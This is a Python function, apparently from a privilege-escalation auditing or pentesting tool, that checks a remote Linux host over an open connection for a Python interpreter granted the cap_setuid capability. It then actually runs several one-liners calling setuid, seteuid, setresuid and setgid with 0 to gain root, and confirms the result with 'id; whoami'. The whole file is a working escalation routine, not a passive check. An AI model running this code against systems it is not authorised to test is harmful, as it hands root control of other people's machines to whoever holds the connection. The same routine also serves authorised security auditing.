def capabilities_privesc(conn, data):
    """
    Detect capabilities and attempt privilege escalation test for Python.
    """
    results = []
                
    if 'cap_setuid' in data and 'python' in data:
        python_path, caps_str = data.split(' = ', 1)
        has_setgid = 'cap_setgid' in caps_str


        attempts = []
        if has_setgid:
            attempts.append("import os; os.setgid(0); os.setuid(0); print(os.geteuid())")
        attempts.append("import os; os.setuid(0); print(os.geteuid())")
        attempts.append("import os; os.seteuid(0); print(os.geteuid())")
        attempts.append("import os; os.setresuid(0,0,0); print(os.geteuid())")

        uid_val = ''
        last_err = ''
        for code in attempts:
            py_cmd = f"{python_path} -c '{code}'"
            stdin, stdout, stderr = conn.exec_command(py_cmd)
            out_txt = stdout.read().decode().strip()
            err_txt = stderr.read().decode().strip()
            if out_txt:
                uid_val = out_txt
                break
            last_err = err_txt
        if not uid_val:
            uid_val = last_err

        if uid_val == "0":
            stdin2, stdout2, stderr2 = conn.exec_command("id; whoami")
            verify = stdout2.read().decode().strip()
            results.append({ 'target':'cap_setuid', 'is_pe':True, 'cmd': py_cmd, 'verify': verify})
        else:
            results.append({ 'target':'cap_setuid', 'is_pe':False})


    return results
